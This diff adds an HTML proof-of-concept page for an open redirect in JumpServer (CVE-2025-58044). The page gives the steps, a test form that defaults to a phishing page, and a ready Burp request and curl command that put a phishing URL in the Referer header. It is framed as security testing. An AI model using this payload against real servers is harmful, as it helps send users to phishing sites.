@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Redirect PoC</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔴 Open Redirect PoC</h1>
+            <p class="subtitle">CVE-2025-58044 - JumpServer Open Redirect via Referer Header</p>
+            <p class="researcher">Researcher: <span id="researcher-name">Your Name</span></p>
+        </header>
+
+        <div class="card">
+            <h2>📋 How It Works</h2>
+            <p>This vulnerability allows an attacker to redirect users to any malicious website by manipulating the <code>Referer</code> header.</p>
+            
+            <div class="step">
+                <span class="step-number">1</span>
+                <span>Attacker sets <code>Referer</code> header to malicious URL</span>
+            </div>
+            <div class="step">
+                <span class="step-number">2</span>
+                <span>Target server redirects to the Referer URL</span>
+            </div>
+            <div class="step">
+                <span class="step-number">3</span>
+                <span>Victim is redirected to attacker-controlled phishing page</span>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🎯 Test Open Redirect</h2>
+            
+            <div class="input-group">
+                <label for="target-url">Target URL:</label>
+                <input type="url" id="target-url" placeholder="https://example.com/core/i18n/ko/" value="https://domain.com/core/i18n/ko/">
+            </div>
+            
+            <div class="input-group">
+                <label for="redirect-url">Redirect to:</label>
+                <input type="url" id="redirect-url" placeholder="https://your-phishing-site.com" value="https://yourname.github.io/open-redirect-poc/phishing.html">
+            </div>
+            
+            <button id="test-btn" class="btn btn-primary">🚀 Test Redirect</button>
+            <button id="copy-btn" class="btn btn-secondary">📋 Copy Curl Command</button>
+        </div>
+
+        <div class="card result-card" id="result-card" style="display:none;">
+            <h2>📊 Result</h2>
+            <div id="result-content"></div>
+        </div>
+
+        <div class="card">
+            <h2>📝 Burp Suite Request</h2>
+            <div class="code-block" id="burp-request">
+                <button class="copy-code-btn" onclick="copyCode('burp-request')">📋 Copy</button>
+                <pre><code>GET /core/i18n/ko/ HTTP/1.1
+Host: domain.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+Referer: https://your-phishing-site.com
+Researcher: Your Name</code></pre>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>📦 Curl Command</h2>
+            <div class="code-block" id="curl-command">
+                <button class="copy-code-btn" onclick="copyCode('curl-command')">📋 Copy</button>
+                <pre><code>curl -v "https://domain.com/core/i18n/ko/" \
+  -H "Referer: https://your-phishing-site.com" \
+  -H "Researcher: Your Name"</code></pre>
+            </div>
+        </div>
+
+        <footer>
+            <p>⚠️ For educational and security testing purposes only.</p>
+            <p>© 2026 Open Redirect PoC</p>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
